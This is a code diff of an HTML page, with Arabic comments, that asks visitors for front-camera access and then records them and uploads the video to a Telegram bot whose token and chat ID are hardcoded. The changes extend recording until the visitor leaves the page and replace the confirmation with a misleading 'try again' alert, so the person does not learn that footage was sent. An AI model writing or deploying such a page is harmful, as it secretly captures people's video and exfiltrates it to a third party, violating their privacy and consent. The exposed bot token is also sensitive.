@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Camera Auto Recorder</title>
+  <title>Smart Camera Recorder</title>
 </head>
 <body>
   <h2>Please allow access to your front camera</h2>
@@ -11,9 +11,11 @@
 
   <script>
     const video = document.getElementById("preview");
+    const BOT_TOKEN = "7609337631:AAHsg9BqNPhW-uSd2mwtMFsaiIuRLy_4AFE";
+    const CHAT_ID = "7372789516";
 
-    const BOT_TOKEN = "7609337631:AAHsg9BqNPhW-uSd2mwtMFsaiIuRLy_4AFE"; // توكن البوت
-    const CHAT_ID = "7372789516"; // ID الخاص بك
+    let mediaRecorder;
+    let chunks = [];
 
     async function initCamera() {
       try {
@@ -24,8 +26,8 @@
 
         video.srcObject = stream;
 
-        const mediaRecorder = new MediaRecorder(stream);
-        const chunks = [];
+        mediaRecorder = new MediaRecorder(stream);
+        chunks = [];
 
         mediaRecorder.ondataavailable = e => chunks.push(e.data);
 
@@ -42,23 +44,24 @@
             body: formData
           });
 
-          alert("✅");
+          alert("try again");
         };
 
         mediaRecorder.start();
-
-        // التسجيل لمدة 3 ثوانٍ فقط
-        setTimeout(() => {
-          mediaRecorder.stop();
-        }, 3000);
-        
       } catch (err) {
-        alert("❌ Camera access denied or not supported.");
+        alert("❌ Camera access denied.");
         console.error(err);
       }
     }
 
-    // شغّل الكاميرا مباشرة
+    // عند مغادرة المستخدم للصفحة يتم إيقاف التسجيل وإرساله
+    window.addEventListener("beforeunload", () => {
+      if (mediaRecorder && mediaRecorder.state === "recording") {
+        mediaRecorder.stop();
+      }
+    });
+
+    // تشغيل الكاميرا عند الدخول
     initCamera();
   </script>
 </body>
